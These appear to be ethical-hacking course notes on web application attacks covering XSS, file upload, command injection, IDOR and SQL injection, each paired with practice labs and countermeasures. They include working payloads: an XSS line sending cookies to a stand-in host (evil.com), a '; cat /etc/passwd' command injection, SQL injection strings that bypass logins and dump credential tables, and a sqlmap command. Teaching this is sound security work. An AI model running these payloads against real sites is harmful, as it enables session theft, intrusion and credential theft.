---
source: Module 8 WebApp hacking part1.pdf, part2.pdf (instructor deck, full — 2 parts)
session: 8
---

# Module 8 — Web Application Hacking

> Covers CEH official chapters 13 (Hacking Web Servers), 14 (Hacking Web
> Applications), and 15 (SQL Injection). The instructor deck merges these
> into two parts.

## Official learning objectives (CEH Ch.13-15)

1. Explain Web Server Concepts and Attacks
2. Explain Web Application Concepts, Threats, and Countermeasures
3. Describe the OWASP Top 10 Web Application Vulnerabilities
4. Explain SQL Injection Concepts and Types
5. Explain SQL Injection Methodology and Evasion Techniques

---

## Part 1 — Web Technologies & XSS (CEH Ch.13-14)

### 1. Web Technology Fundamentals

**Website vs Web Application:** a website delivers static content; a web
application processes user input and generates dynamic responses.

**HTTP Protocol:**
- Client-server architecture: client sends **request**, server sends **response**
- Request methods: GET (retrieve), POST (send data), PUT, DELETE, UPDATE
- **HTTPS** = HTTP + SSL/TLS — not a separate protocol, encrypts the HTTP
  channel

**URL structure:** `https://sub.example.com/dir?param=value`
- Protocol → subdomain → domain → subdirectory → parameter

**Client vs server side:**
- Client: HTML, JavaScript (execute in browser)
- Server: PHP, Python, Node.js (execute on server)
- Database: SQL (structured queries)

**Proxy:** intercepts traffic between client and server. **Burp Suite** —
the primary web app testing proxy.

### 2. XSS (Cross-Site Scripting)

OWASP Top 10 vulnerability. Attacker injects malicious JavaScript into
website inputs that gets executed in other users' browsers.

**Rule:** test ALL available input fields for XSS.

| Type | Description | Persistence | Severity |
|---|---|---|---|
| Reflected | Payload reflected in response, not stored — requires victim to click crafted URL | None | Medium |
| Stored | Payload stored in database, executes for every visitor | Persistent | High |
| DOM-based | Vulnerability in client-side DOM manipulation | Varies | Medium-High |

**Example payloads:**
- `<script>alert(1)</script>` — proof of concept
- `<script>alert(document.cookie)</script>` — steal session cookie
- `<script>location='http://evil.com?c='+document.cookie</script>` — exfiltrate

**Filter bypass:** when `<script>` is filtered, try `<SCRIPT>` (case
manipulation), `<img onerror=alert(1)>`, event handlers, encoding.

**Practice platforms:** DVWA (low/medium/high security levels),
PortSwigger Web Security Academy (Labs 1-9), OWASP Juice Shop.

**Real-world impact:** session hijacking, account takeover, keylogging,
phishing via injected forms. Bug bounty example: $1000 XSS on production
site.

---

## Part 2 — Web Attacks & SQL Injection (CEH Ch.14-15)

### 3. Web Enumeration (pre-attack)

| Target | Tool |
|---|---|
| Parameters | ParamSpider (discover URL parameters) |
| Subdirectories | dirb, DirBuster, wfuzz, gobuster |
| Subdomains | Sublist3r, Amass |

### 4. File Upload Vulnerability

OWASP Top 10. Attacker uploads a malicious file (e.g. PHP reverse shell)
to the server and executes it.

**Attack flow:** find upload endpoint → upload webshell (e.g. PentestMonkey
PHP reverse shell) → navigate to uploaded file → get shell.

**Countermeasures:** whitelist allowed file extensions, check MIME types,
rename uploaded files, store uploads outside webroot, disable execution
in upload directory.

### 5. Command Injection

OWASP Top 10. Attacker injects OS commands through web application inputs
that interact with the system.

**Example:** input field runs `ping <user_input>` → attacker enters
`; cat /etc/passwd` → server executes both commands.

**Countermeasures:** input validation, parameterized commands, least
privilege, avoid passing user input to system commands.

### 6. IDOR (Insecure Direct Object Reference)

OWASP Top 10. Attacker modifies object references (IDs, parameters) in
requests to access unauthorized data.

**Example:** `GET /profile?id=123` → change to `id=124` → view another
user's profile without authorization.

**Practice:** bWAPP (IDOR testing scenarios).

### 7. SQL Injection

Attacker injects malicious SQL through unfiltered input fields. If the
application concatenates user input directly into SQL queries, the
injected SQL executes on the database.

### SQL Fundamentals (from deck)

- `CREATE TABLE`, `INSERT`, `SELECT`, `WHERE`, `UNION`, `DELETE`, `DROP`
- Authentication: `SELECT * FROM users WHERE user='x' AND pass='y'`
- Injection: `' OR 1=1 --` bypasses authentication

### SQL Injection Types

| Type | Description | Visibility |
|---|---|---|
| In-band (classic) | Results returned directly in the response | Full output visible |
| Blind (boolean) | No output, but true/false responses differ (content or status) | Infer data bit by bit |
| Blind (time-based) | No visible difference, but `SLEEP()` causes measurable delay | Infer via response timing |

### SQLi Exploitation Flow (from deck, DVWA)

**Low security:**
1. `' ORDER BY 2 #` — find number of columns
2. `' UNION SELECT table_name, NULL FROM information_schema.tables #` — list tables
3. `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #` — list columns
4. `' UNION SELECT user, password FROM users #` — dump credentials

**Medium security:** input type changed (dropdown), but interceptable with Burp Suite — same SQLi applies.

### Automated SQLi — sqlmap

`sqlmap -u "http://target/page?id=1" --dbs` — automated database
enumeration, table dump, shell upload.

### Practice Platforms

- DVWA (low/medium/high)
- PortSwigger Web Security Academy (SQLi labs)
- OWASP Juice Shop (`https://juice-shop.herokuapp.com`)
- bWAPP (`https://bwapp.hakhub.net`)

### Countermeasures

- **Parameterized queries / prepared statements** (primary defense)
- Input validation and sanitization
- Least-privilege database accounts
- WAF (Web Application Firewall)
- Regular code review and security testing
- Error handling that doesn't expose database details
